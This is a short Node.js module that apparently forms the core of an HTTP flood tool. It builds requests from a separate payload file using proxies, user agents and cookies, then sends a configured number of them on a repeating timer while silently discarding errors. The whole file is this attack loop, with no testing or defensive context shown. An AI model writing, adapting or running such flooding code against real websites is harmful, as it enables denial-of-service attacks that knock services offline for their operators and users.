const request = require('request');


async function fukthis(obj, args){
    setInterval(() => {
        try{
            for(let i = 0; i < args.rate; i++) {
                request(obj);
            }
        } catch(e){}
    }, (args.delay * 1000));
}

function start(args, proxy, ua, secondcookies){
    fukthis(require('./payloads/http.js')(args, proxy, ua, secondcookies), args)
}

module.exports = start;